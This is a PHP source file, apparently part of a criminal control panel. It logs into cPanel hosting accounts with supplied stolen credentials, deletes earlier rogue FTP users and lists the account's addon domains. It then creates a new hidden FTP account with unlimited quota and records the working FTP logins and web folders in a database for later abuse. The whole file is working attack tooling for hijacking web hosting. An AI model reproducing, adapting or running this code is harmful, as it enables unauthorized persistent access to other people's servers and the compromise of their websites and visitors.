<?php

error_reporting(-1);

require($dir['site'] . '/classes/curl.class.php');

function createPassword($length) {
	$chars = '1234567890!#$abcdefghijkmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$password = '';
	for($i = 0; $i < $length; $i++){
		$password .= @$chars[mt_rand(0, strlen($chars)-1)];
	}
	return $password;
}

ini_set('error_log', $dir['site'] . 'cache/panels.txt');
if(!function_exists('error_import_handler')){
	function error_import_handler($code, $msg, $file, $line){
		global $dir;
		if($code != 8) file_put_contents($dir['site'] . 'cache/panels.txt', print_r(array('code' => $code, 'msg' => $msg, 'file' => $file, 'line' => $line), true) . "\r\n", FILE_APPEND);
	}
	set_error_handler('error_import_handler');
}

$cookie = $dir['site'] . '/cache/panels/' . md5($task->v1.time().mt_rand(1000,99999)) . '.txt';

if(empty($task->v1) || empty($task->v2) || empty($task->v3)) exit;

$http = new get_http();
$http->clear();
$http->config['post'] = true;
$http->config['postFields'] = 'login_theme=cpanel&user='.$task->v2.'&pass='.$task->v3.'&goto_uri=%2F';
$http->config['cookieFileLocation'] = $cookie;
$http->config['includeHeader'] = true;
$http->config['followlocation'] = false;
$http->config['referer'] = $task->v1 . '/login/';
$http->open($task->v1 . '/login/');

if($http->status == 301 && !empty($http->webpage)){
	//file_put_contents($dir['cur_logs'] . '/panels_success.txt', base64_decode($_SERVER['argv'][1]) . "\r\n", FILE_APPEND);
	//$mysqli->query('update bf_filter_panels set status = \'1\' WHERE (id = \''.$task->id.'\')');
	$mysqli->query('INSERT DELAYED INTO bf_panels_debug (type, post_id) VALUES (\'1\', \''.$task->id.'\')');

	$domains = array();
	$user = 'bcp' . mt_rand(10, 999);
	$pwd = createPassword(12);

	preg_match_all('~Location: /frontend/(.*)/index.html~isU', $http->webpage, $match_design, PREG_SET_ORDER);
	if(!empty($match_design[0][1])){
		$design = $match_design[0][1];
	}else{
		$design = 'x3';
	}

	unset($match_design);

	$http->clear();
	$http->config['cookieFileLocation'] = $cookie;
	$http->config['referer'] = $task->v1 . '/frontend/'.$design.'/setlang/index.html';
	$http->open($task->v1 . '/frontend/'.$design.'/setlang/goto.html?page=setlang.html&lang=en');

	$http->clear();
	$http->config['cookieFileLocation'] = $cookie;
	$http->config['referer'] = $task->v1 . '/frontend/'.$design.'/index.html';
	$http->open($task->v1 . '/frontend/'.$design.'/style/switchstyle.html?brandingpkg=');

	if($http->status == 200 && !empty($http->webpage)){
		$http->clear();
		$http->config['cookieFileLocation'] = $cookie;
		$http->config['followlocation'] = false;
		$http->config['referer'] = $task->v1 . '/frontend/'.$design.'/index.html';
		$http->open($task->v1 . '/frontend/'.$design.'/ftp/accounts_pure-ftpd.html?itemsperpage=500');

		if($http->status == 200 && !empty($http->webpage)){
			preg_match_all('~<tr class="(row-even|row-odd)">(.*)<\/tr>~isU', $http->webpage, $match, PREG_SET_ORDER);

			if(count($match) > 0){
				foreach($match as $item){
					preg_match_all('~<td(.*)>(.*)<\/td>~isU', $item[2], $matchs, PREG_SET_ORDER);
					if(count($matchs) > 0){
						$uitem = explode('@', strip_tags($matchs[0][2]));
						if(strpos($uitem[0], 'bcp') === 0 || strpos($uitem[0], 'bcpw') === 0){
							$http->clear();
							$http->config['cookieFileLocation'] = $cookie;
							$http->config['followlocation'] = false;
							$http->config['referer'] = $task->v1 . '/frontend/'.$design.'/ftp/accounts_pure-ftpd.html?itemsperpage=500';
							$http->open($task->v1 . '/frontend/'.$design.'/ftp/realdodelftp.html?login=' . $uitem[0]);

							//file_put_contents($dir['cur_logs'] . '/delete_ftps.txt', base64_decode($_SERVER['argv'][1]) . ' - (' . $matchs[0][2] . ")\r\n", FILE_APPEND);
							$mysqli->query('INSERT DELAYED INTO bf_panels_debug (type, msg, post_id) VALUES (\'2\', \''.$matchs[0][2].'\', \''.$task->id.'\')');
						}
					}
				}
			}
		}

		$http->clear();
		$http->config['cookieFileLocation'] = $cookie;
		$http->config['referer'] = $task->v1 . '/frontend/'.$design.'/index.html';
		$http->open($task->v1 . '/frontend/'.$design.'/addon/index.html?itemsperpage=500');

		if($http->status == 200 && !empty($http->webpage)){
			preg_match_all('~<tr class="(row-even|row-odd)">(.*)<\/tr>~isU', $http->webpage, $match, PREG_SET_ORDER);

			if(count($match) > 0){
				foreach($match as $item){
					preg_match_all('~<td(.*)>(.*)<\/td>~isU', $item[2], $matchs, PREG_SET_ORDER);
					if(count($matchs) > 0){
                        $tmp_val['host'] = strip_tags($matchs[0][2]);
                        $tmp_val['folder'] = strip_tags($matchs[1][2]);
                        $domains[] = $tmp_val;
                        unset($tmp_val);
					}
				}
			}
		}
	}

	$http->clear();
	$http->config['post'] = true;
	$http->config['postFields'] = 'login='.$user.'&password='.$pwd.'&password2='.$pwd.'&homedir=&quota=unlimited';
	$http->config['cookieFileLocation'] = $cookie;
	$http->config['referer'] = $task->v1 . '/frontend/'.$design.'/ftp/accounts_pure-ftpd.html?itemsperpage=500';
	$http->config['attempt'] = 3;
	$http->open($task->v1 . '/frontend/'.$design.'/ftp/doaddftp.html');

	if($http->status == 200 && !empty($http->webpage)){
		if(stripos($http->webpage, 'FTP Account Added!') != false){
			//file_put_contents($dir['cur_logs'] . '/ftps_nousage_create.txt', base64_decode($_SERVER['argv'][1]) . ' - '.$user.':'.$pwd . "\r\n", FILE_APPEND);
			$mysqli->query('INSERT DELAYED INTO bf_panels_debug (type, msg, post_id) VALUES (\'4\', \''. ($user . ':' . $pwd) . '\', \''.$task->id.'\')');
		}else{
			preg_match_all('~' . $user . '@(.*)<~isU', $http->webpage, $match, PREG_SET_ORDER);

			if(!empty($match[0][1])){
				$host = str_ireplace($user . '@', '', $match[0][1]);
				//file_put_contents($dir['cur_logs'] . '/ftps_create.txt', 'ftp://' . $user . '@'. $match[0][1] . ':' . $pwd . '@' . $host . ':21/' . "\r\n", FILE_APPEND);
				//file_put_contents($dir['cur_logs'] . '/ftps_create_folder_domain.txt', str_ireplace('ftp.', '', $host) . '|ftp://' . $user . '@'. $match[0][1] . ':' . $pwd . '@' . $host . ':21/public_html/' . "\r\n", FILE_APPEND);
		        //file_put_contents($dir['cur_logs'] . '/domains.txt', str_ireplace('ftp.', '', $host) . "\r\n", FILE_APPEND);
                $mysqli->query('INSERT DELAYED INTO bf_filter_ftps_panels (v1, v2, v3, md5_hash, program) VALUES (\''.($user . '@'. $match[0][1]).'\', \''.$pwd.'\', \''.$host.'\', \''.md5($user . '@'. $match[0][1] . $pwd . $host).'\', \''.$task->program.'\')');

		        if(count($domains) > 0){
		        	foreach($domains as $item){
		        		//file_put_contents($dir['cur_logs'] . '/ftps_create_folder_domain.txt', $item['host'] . '|ftp://' . $user . '@'. $match[0][1] . ':' . $pwd . '@' . $host . ':21/' . $item['folder'] . "\r\n", FILE_APPEND);
		        		//file_put_contents($dir['cur_logs'] . '/domains.txt', $item['host'] . "\r\n", FILE_APPEND);
		        		if(strpos($item['folder'], '/') !== 0) $item['folder'] = '/' . $item['folder'];
		        		$mysqli->query('INSERT DELAYED INTO bf_filter_ftps_panels (v1, v2, v3, v4, md5_hash, program) VALUES (\''.($user . '@'. $match[0][1]).'\', \''.$pwd.'\', \''.$item['host'].'\', \''.$item['folder'].'\', \''.md5($user . '@'. $match[0][1] . $pwd . $item['host'] . $item['folder']).'\', \''.$task->program.'\')');
		        	}
		        }
			}else{
				preg_match_all('~<li>(.*)&nbsp;(.*)<\/li>~isU', $http->webpage, $match, PREG_SET_ORDER);

				if(count($match) >= 4){
					//file_put_contents($dir['cur_logs'] . '/ftps_create.txt', 'ftp://'.$match[0][3].':'.$match[1][3].'@'.$match[2][3].':'.$match[3][3].'/' . "\r\n", FILE_APPEND);
					//file_put_contents($dir['cur_logs'] . '/ftps_create_folder_domain.txt', str_ireplace('ftp.', '', $match[2][3]) . '|ftp://'.$match[0][3].':'.$match[1][3].'@'.$match[2][3].':'.$match[3][3].'/public_html/' . "\r\n", FILE_APPEND);
		            //file_put_contents($dir['cur_logs'] . '/domains.txt', str_ireplace('ftp.', '', $match[2][3]) . "\r\n", FILE_APPEND);

                    $mysqli->query('INSERT DELAYED INTO bf_filter_ftps_panels (v1, v2, v3, md5_hash, program) VALUES (\''.$match[0][3].'\', \''.$match[1][3].'\', \''.$match[2][3].':'.$match[3][3].'\', \''.md5($match[0][3] . $match[1][3] . $match[2][3].':'.$match[3][3]).'\', \''.$task->program.'\')');

					if(count($domains) > 0){
						foreach($domains as $item){
							//file_put_contents($dir['cur_logs'] . '/ftps_create_folder_domain.txt', $item['host'] . '|ftp://'.$match[0][3].':'.$match[1][3].'@'.$match[2][3].':'.$match[3][3].'/' . $item['folder'] . "\r\n", FILE_APPEND);
						    //file_put_contents($dir['cur_logs'] . '/domains.txt', $item['host'] . "\r\n", FILE_APPEND);
							if(strpos($item['folder'], '/') !== 0) $item['folder'] = '/' . $item['folder'];
							$mysqli->query('INSERT DELAYED INTO bf_filter_ftps_panels (v1, v2, v3, v4, md5_hash, program) VALUES (\''.$match[0][3].'\', \''.$match[1][3].'\', \''.$match[2][3].':'.$match[3][3].'\', \''.$item['folder'].'\', \''.md5($match[0][3] . $match[1][3] . $match[2][3].':'.$match[3][3] . $item['folder']).'\', \''.$task->program.'\')');
						}
					}
				}else{
					//$name_html = md5($_SERVER['argv'][1] . time().mt_rand(100,99999));
					//file_put_contents($dir['cur_logs'] . '/errors_add_ftps.txt', base64_decode($_SERVER['argv'][1]) . ' html('  . $name_html . ")\r\n", FILE_APPEND);
					//file_put_contents($dir['cur_logs'] . '/errors/'.$name_html.'.html', print_r($http, true));
					$mysqli->query('INSERT DELAYED INTO bf_panels_debug (type, msg, post_id) VALUES (\'5\', \''. json_encode(array($http)) . '\', \''.$task->id.'\')');
				}
			}
		}
	}else{
		if($http->status == 200 && empty($http->webpage)){
			//file_put_contents($dir['cur_logs'] . '/ftps_nousage_create.txt', base64_decode($_SERVER['argv'][1]) . ' - '.$user.':'.$pwd . "\r\n", FILE_APPEND);
			$mysqli->query('INSERT DELAYED INTO bf_panels_debug (type, msg, post_id) VALUES (\'4\', \''. ($user . ':' . $pwd) . '\', \''.$task->id.'\')');
		}else{
			$name_html = md5($_SERVER['argv'][1] . time().mt_rand(100,99999));
			//file_put_contents($dir['cur_logs'] . '/errors_add_ftps.txt', base64_decode($_SERVER['argv'][1]) . ' html('  . $name_html . ")\r\n", FILE_APPEND);
			//file_put_contents($dir['cur_logs'] . '/errors/'.$name_html.'.html', print_r($http, true));
			$mysqli->query('INSERT DELAYED INTO bf_panels_debug (type, msg, post_id) VALUES (\'5\', \''. json_encode(array($http)) . '\', \''.$task->id.'\')');
		}
	}
}else{
	//file_put_contents($dir['cur_logs'] . '/errors_autorize.txt', base64_decode($_SERVER['argv'][1]) . "\r\n", FILE_APPEND);
	$mysqli->query('INSERT DELAYED INTO bf_panels_debug (type, post_id) VALUES (\'6\', \''.$task->id.'\')');
}

if(file_exists($cookie)) @unlink($cookie);
//@unlink($dir['script'] . DIRECTORY_SEPARATOR . 'cache' . DIRECTORY_SEPARATOR . 'imports' . DIRECTORY_SEPARATOR . $mypid);

?>